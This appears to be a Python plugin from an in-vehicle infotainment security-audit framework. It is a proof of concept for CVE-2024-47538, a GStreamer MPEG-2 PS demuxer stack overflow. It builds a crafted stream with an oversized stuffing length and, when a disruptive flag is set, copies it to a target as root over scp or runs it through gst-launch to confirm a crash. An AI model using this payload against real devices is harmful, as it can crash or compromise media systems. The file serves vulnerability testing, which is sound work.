#!/usr/bin/env python3
"""CVE-2024-47538 – GStreamer stack buffer overflow in MPEG-2 PS demuxer.

Public PoC reference: https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3833
Technique:
  gst_ps_demux_parse_pack_header() in gst/mpegdemux/gstmpegdemux.c reads a
  variable-length MPEG-2 PS pack header.  A crafted stream with pack_header_length
  set to a large value causes a stack buffer overflow when copying the stuffing
  bytes into a fixed-size buffer.

  Attack surface in IVI: Any GStreamer-based media player or CarPlay/AndroidAuto
  bridge that can receive a crafted transport stream (USB, MMS, streaming URL).

Malformed stream construction:
  - Start code: 0x000001BA (MPEG-2 PS Pack Header)
  - SCR / mux_rate bytes: arbitrary valid values
  - pack_stuffing_length: 0xFF (255) – far beyond the 7-byte stack buffer
"""
from __future__ import annotations

import struct
import tempfile
from pathlib import Path

import sys as _sys, subprocess as _subproc, re as _re
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).parent))
from probe_utils import version_in_range, detection_confidence
from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 20,
    "cve": "CVE-2024-47538",
    "year": 2024,
    "domain": "application",
    "vendor_product": "GStreamer (gst-plugins-bad / gst-plugins-ugly)",
    "component": "gstmpegdemux.c gst_ps_demux_parse_pack_header",
    "type": "Stack buffer overflow → RCE / DoS",
    "summary": (
        "pack_stuffing_length value 0xFF triggers stack overflow when copying "
        "stuffing bytes into a 7-byte stack array, corrupting return address."
    ),
    "source_url": "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3833",
    "requires_manual_review": True,
    "affected": [{"vendor": "GStreamer", "product": "GStreamer", "versions": [{"version": "<1.24.9", "status": "affected"}]}],
}


def _build_malformed_mpegps() -> bytes:
    """MPEG-2 PS stream with pack_stuffing_length=0xFF (255)."""
    # MPEG-2 PS Pack Header: start_code=0x000001BA
    start_code = b'\x00\x00\x01\xba'
    # SCR = 0 (5 bytes): 2|SCR_b32:30 M_1 SCR_b29:15 M_1 SCR_b14:0 M_1 SCR_ext M_1
    scr = bytes([0x44, 0x00, 0x04, 0x00, 0x04])
    # mux_rate (3 bytes) + marker
    mux_rate = bytes([0x01, 0x00, 0x01])
    # pack_stuffing_length = 0xFF (overflow trigger, valid range 0-7)
    stuffing_len_byte = bytes([0xff])  # lower 3 bits = 0b111, rest reserved=0
    stuffing = b'\xff' * 255          # actual stuffing bytes (causes stack OOB copy)
    pack_header = start_code + scr + mux_rate + stuffing_len_byte + stuffing

    # Follow with a system header (truncated) to exercise more parse paths
    sys_hdr = b'\x00\x00\x01\xbb' + struct.pack('>H', 6) + b'\x00' * 6
    # PES packet (video) pointing to some data
    pes_hdr = b'\x00\x00\x01\xe0' + struct.pack('>H', 12) + b'\x80\x00\x00' + b'\xde\xad' * 4

    return pack_header + sys_hdr + pes_hdr


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    target_ip = (plugin.params or {}).get("target_ip", "")

    stream = _build_malformed_mpegps()
    out = Path(tempfile.mkdtemp()) / "cve_2024_47538_ps_overflow.mpg"
    out.write_bytes(stream)

    evidence = {
        "cve": "CVE-2024-47538",
        "stream_path": str(out),
        "stream_size_bytes": len(stream),
        "trigger": "pack_stuffing_length=0xFF in MPEG-2 PS Pack Header",
        "expected_behavior": "GStreamer crash / stack smash in gst_ps_demux_parse_pack_header",
    }

    if allow_disruptive:
        import subprocess as _sp
        if target_ip:
            result = _sp.run(
                ["scp", str(out), f"root@{target_ip}:/tmp/cve_47538.mpg"],
                capture_output=True, text=True, timeout=20,
            )
            evidence["delivery_rc"] = result.returncode
        else:
            result = _sp.run(
                ["gst-launch-1.0", "-v", "filesrc", f"location={out}",
                 "!", "mpegpsdemux", "!", "fakesink"],
                capture_output=True, text=True, timeout=15,
            )
            evidence["local_test_rc"]  = result.returncode
            evidence["local_test_out"] = result.stdout[:400] + result.stderr[:300]
            evidence["crashed"] = "Segmentation fault" in result.stderr or \
                                  "Aborted" in result.stderr or \
                                  result.returncode in (-11, -6, 139)


    # ── Non-disruptive version probe ─────────────────────────────────────────
    _tool_out = ""
    try:
        _r = _subproc.run(
            'gst-inspect-1.0 --version', shell=True, capture_output=True, text=True, timeout=10
        )
        _tool_out = (_r.stdout + _r.stderr).strip()
    except Exception as _e:
        _tool_out = f"tool_error:{_e}"

    evidence["tool_version_output"] = _tool_out
    _ver_m = _re.search('GStreamer (\\d+\\.\\d+\\.\\d+)', _tool_out)
    _detected_ver = _ver_m.group(1) if _ver_m else None
    evidence["detected_version"] = _detected_ver

    if _detected_ver:
        _in_range = version_in_range(_detected_ver, lt='1.24.9')
        evidence["version_in_affected_range"] = _in_range
    else:
        _in_range = None
        evidence["version_detection"] = "tool not found or version not parseable"

    # ── Disruptive crash test ─────────────────────────────────────────────────
    _crash_confirmed = False
    if allow_disruptive:
        # (existing crash-test code above already populated evidence["crashed"])
        _crash_confirmed = evidence.get("crashed", False)

    # ── Verdict ───────────────────────────────────────────────────────────────
    if _crash_confirmed:
        _level = "A"
        _vuln  = True
    elif _in_range is True:
        _level = "C"
        _vuln  = True
    elif _in_range is False:
        _level = "C"
        _vuln  = False
    else:
        _level = "E"
        _vuln  = None

    evidence["poc_source"] = 'GStreamer gitlab issue #3833 / CVE-2024-47538'
    return {
        "vulnerable": _vuln,
        "evidence": evidence,
        "requires_manual_review": _vuln is None,
        "detection_confidence": detection_confidence(
            _level, evidence,
            "crash_confirmed" if _crash_confirmed else
            ("version_range" if _in_range is not None else "passive_only")
        ),
    }



class Poc74CVE202447538GstreamerMpegPsStackOverflowRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-074"
    meta_poc_name   = 'CVE-2024-47538 GStreamer MPEG PS Pack Header 栈溢出 RCE Active Validation'
    meta_cve_id     = "CVE-2024-47538"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["linux", "android"]
    meta_required_params = []
    meta_optional_params = ["target_ip", "allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3833"
    meta_references       = ['https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3833']
    meta_attack_surface = "GStreamer MPEG-2 PS demuxer stack overflow via crafted stream"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "74_GStreamer_Stack_buffer_overflow_in_media_parsing_Audit") if "VULN" in dir() else "74_GStreamer_Stack_buffer_overflow_in_media_parsing_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc74CVE202447538GstreamerMpegPsStackOverflowRceAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
